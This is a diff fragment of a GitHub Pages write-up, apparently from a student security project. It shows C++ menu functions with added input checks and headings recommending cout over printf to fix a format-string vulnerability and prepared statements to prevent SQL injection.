+<span class="pl-s">        cout &lt;&lt; "Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: ";</span>
+<span class="pl-s">        cin &gt;&gt; rorW;</span>
+<span class="pl-s">        return rorW;</span>
+<span class="pl-s">}</span></pre></div>
+
+<h5>
+<a id="updated-loginorregister" class="anchor" href="#updated-loginorregister" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>updated loginOrRegister()</h5>
+
+<div class="highlight highlight-source-shell"><pre>string <span class="pl-en">loginOrRegister</span>() {
+        // Prompt user <span class="pl-k">for</span> “login” or “register”
+        string isLogin<span class="pl-k">;</span>
+        cout <span class="pl-k">&lt;&lt;</span> <span class="pl-s"><span class="pl-pds">"</span>Please enter 0 for register or 1 for login: <span class="pl-pds">"</span></span><span class="pl-k">;</span>
+        cin <span class="pl-k">&gt;&gt;</span> isLogin<span class="pl-k">;</span>
+        <span class="pl-k">if</span> (<span class="pl-k">!</span>isLogin.compare(<span class="pl-s"><span class="pl-pds">"</span>1<span class="pl-pds">"</span></span>)) {
+                <span class="pl-k">if</span>(<span class="pl-en">login</span>()){
+                        cout<span class="pl-k">&lt;&lt;</span> <span class="pl-s"><span class="pl-pds">"</span>You logged in successfully!<span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-k">&lt;&lt;</span><span class="pl-k">endl</span>;</span>
+<span class="pl-s">                }</span>
+<span class="pl-s">                else{</span>
+<span class="pl-s">                        cout &lt;&lt; "Wrong info!" &lt;&lt;endl;</span>
+<span class="pl-s">                        loginOrRegister();</span>
+<span class="pl-s">                }</span>
+<span class="pl-s">        }</span>
+<span class="pl-s">        else if(!isLogin.compare("0")){</span>
+<span class="pl-s">                username = registerUser();</span>
+<span class="pl-s">        }</span>
+<span class="pl-s">        else {</span>
+<span class="pl-s">          cin.clear();</span>
+<span class="pl-s">          cout &lt;&lt; "\n";</span>
+<span class="pl-s">          loginOrRegister();</span>
+<span class="pl-s">        }</span>
+<span class="pl-s">        return username;</span>
+<span class="pl-s">}</span>
+<span class="pl-s"></span>
+<span class="pl-s">int readOrWrite() {</span>
+<span class="pl-s">        //Return 1 if they want to read, 0 if they want to write;</span>
+<span class="pl-s">        string choice;</span>
+<span class="pl-s">        cout &lt;&lt; "Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: ";</span>
+<span class="pl-s">        cin &gt;&gt; choice;</span>
+<span class="pl-s">        if (!choice.compare("0")) {</span>
+<span class="pl-s">          return 0;</span>
+<span class="pl-s">        } else if (!choice.compare("1")){</span>
+<span class="pl-s">          return 1;</span>
+<span class="pl-s">        } else if (!choice.compare("2")) {</span>
+<span class="pl-s">          return 2;</span>
+<span class="pl-s">        } else {</span>
+<span class="pl-s">          cin.clear();</span>
+<span class="pl-s">          cout &lt;&lt; "\n";</span>
+<span class="pl-s">          readOrWrite();</span>
+<span class="pl-s">        }</span>
+<span class="pl-s">        return -1;</span>
+<span class="pl-s">}</span></pre></div>
+
+<h3>
+<a id="string-vulnerability-fix" class="anchor" href="#string-vulnerability-fix" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>String Vulnerability Fix</h3>
+
+<h5>
+<a id="simply-replace-all-printf-commands-with-cout-" class="anchor" href="#simply-replace-all-printf-commands-with-cout-" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Simply replace all <code>printf()</code> commands with <code>cout &lt;&lt;</code>
+</h5>
+
+<h3>
+<a id="sql-injection-fix" class="anchor" href="#sql-injection-fix" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>SQL Injection Fix</h3>
+
+<h5>
+<a id="use-prepared-statements-or-bind-parameters" class="anchor" href="#use-prepared-statements-or-bind-parameters" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Use prepared statements or bind parameters</h5>
+</blockquote>
+
+      <footer class="site-footer">
+
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the <a href="https://github.com/jasonlong/cayman-theme">Cayman theme</a> by <a href="https://twitter.com/jasonlong">Jason Long</a>.</span>
       </footer>
-    </div>
-    <!--[if !IE]><script>fixScale(document);</script><![endif]-->
-    
+
+    </section>
+
+  
   </body>
 </html>
